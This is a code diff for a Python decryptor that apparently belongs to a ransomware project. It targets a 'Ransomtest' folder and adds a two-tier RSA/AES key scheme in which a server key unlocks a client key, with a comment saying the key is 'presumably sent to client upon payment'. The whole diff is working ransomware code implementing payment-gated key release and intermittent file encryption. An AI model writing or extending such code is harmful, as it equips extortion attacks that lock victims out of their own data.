@@ -4,7 +4,8 @@ from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP, AES
 
 directory = './Ransomtest' # the directory to decrypt
-privateKeyFile = 'private.pem' # file name of the private key
+clientPrivateKeyFile = 'client_private.pem' # file name of the client private key
+serverPrivateKeyFile = 'server_private.pem' # file name of the server private key
 chunk_size = 4 # integer value of the size of chunks that files will be split into
 intermittent_size = 4 # integer value of how many unencrypted chunks per encrypted chunk
 fileExtension = '.decrypted' # file extension for decrypted files
@@ -24,16 +25,31 @@ def scanRecurse(baseDir):
             yield from scanRecurse(entry.path)
 
 
-def decrypt(dataFile, privateKeyFile):
+def decryptFile(dataFile):
     '''
     use EAX mode to allow detection of unauthorized modifications
     '''
 
-    # read private key from file
-    with open(privateKeyFile, 'rb') as f:
-        privateKey = f.read()
-        # create private key object
-        key = RSA.import_key(privateKey)
+    # read server private key
+    with open(serverPrivateKeyFile, 'rb') as f:
+        key = f.read()
+        serverPrivateKey = RSA.import_key(key)
+
+    # read client private key
+    with open(clientPrivateKeyFile, 'rb') as f:
+        encryptedSessionKey, nonce, tag, encryptedPrivateKey = [ f.read(x) for x in (serverPrivateKey.size_in_bytes(), 16, 16, -1) ]
+    
+    # decrypt the private key with server's private key (presumably sent to client upon payment)
+    # decrypt the session key first
+    cipher = PKCS1_OAEP.new(serverPrivateKey)
+    sessionKey = cipher.decrypt(encryptedSessionKey)
+
+    # decrypt the data with the session key
+    cipher = AES.new(sessionKey, AES.MODE_EAX, nonce)
+    decryptedPrivateKey = cipher.decrypt_and_verify(encryptedPrivateKey, tag)
+
+    # create private key object from decrypted private key
+    key = RSA.import_key(decryptedPrivateKey)
 
     # read data from file
     extension = dataFile.suffix.lower()
@@ -86,5 +102,5 @@ for item in scanRecurse(directory):
         os.remove(filePath)
     elif fileType in includeExtension:
         print(f"Now decrypting: {Path(filePath)}") 
-        decrypt(filePath, privateKeyFile)
+        decryptFile(filePath)
     
